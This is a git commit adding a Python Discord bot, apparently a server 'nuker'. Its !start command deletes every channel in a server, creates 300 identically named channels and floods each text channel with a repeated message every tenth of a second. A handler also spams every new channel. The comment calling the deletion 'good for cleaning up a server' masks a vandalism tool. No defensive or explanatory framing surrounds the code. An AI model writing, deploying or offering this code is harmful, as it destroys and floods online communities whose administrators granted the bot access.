3c6f85fe3ba991bb6d3405310680b9ef85aad0d3
Luke <137133945+LukeTheNuke64@users.noreply.github.com>
2025-02-22 18:56:25 -0800

    Add files via upload

---
+++ main.py
@@ -0,0 +1,95 @@
+import discord
+import asyncio
+from discord.ext import commands
+
+intents = discord.Intents.default()
+intents.typing = False
+intents.presences = False
+intents.message_content = True  
+
+bot = commands.Bot(command_prefix="!", intents=intents)
+
+# Customize the bot here
+BOT_TOKEN = "YOUR TOKEN HERE"
+MESSAGE = "YOUR MESSAGE HERE"
+CHANNEL_NAME = "CHANNEL NAME"
+CHANNELS_CREATED = 300
+
+
+@bot.command()
+async def delete(ctx):  # Good for cleaning up a server
+    guild = ctx.guild  
+    print("Deleting all channels...")
+    if guild:
+        for channel in guild.channels:
+            try:
+                await channel.delete()
+            except discord.Forbidden:
+                pass
+            except discord.HTTPException:
+                pass
+
+
+async def create(ctx):
+    guild = ctx.guild  
+    print("Creating channels...")
+    for i in range(CHANNELS_CREATED):
+        try:
+            channel_name = CHANNEL_NAME 
+            await guild.create_text_channel(channel_name)
+        except discord.Forbidden:
+            pass
+        except discord.HTTPException:
+            pass
+
+
+async def message(ctx):
+    try:
+        guild = ctx.guild  
+        if guild:
+            tasks = []  
+
+            for channel in guild.text_channels:
+                tasks.append(spam_messages(channel))
+        
+            await asyncio.gather(*tasks)
+        else:
+            pass
+
+    except Exception:
+        pass
+
+
+@bot.event
+async def on_guild_channel_create(channel):
+    if isinstance(channel, discord.TextChannel):
+        await spam_messages(channel)
+
+
+async def spam_messages(channel):
+    for _ in range(CHANNELS_CREATED):  
+        await channel.send(MESSAGE) 
+        print(f'Message sent in {channel.name}')
+        await asyncio.sleep(0.10)  
+
+
+@bot.command()
+async def forcestop(ctx):
+    await bot.close()  
+
+
+@bot.command()
+async def start(ctx):
+    await delete(ctx)
+    await asyncio.gather(create(ctx), message(ctx))
+
+
+@bot.event
+async def on_ready():
+    activity = discord.Activity(type=discord.ActivityType.watching, name="you")
+    await bot.change_presence(status=discord.Status.online, activity=activity)
+    
+    print(f"Successfully connected to {bot.user}")
+
+
+bot.run(BOT_TOKEN)
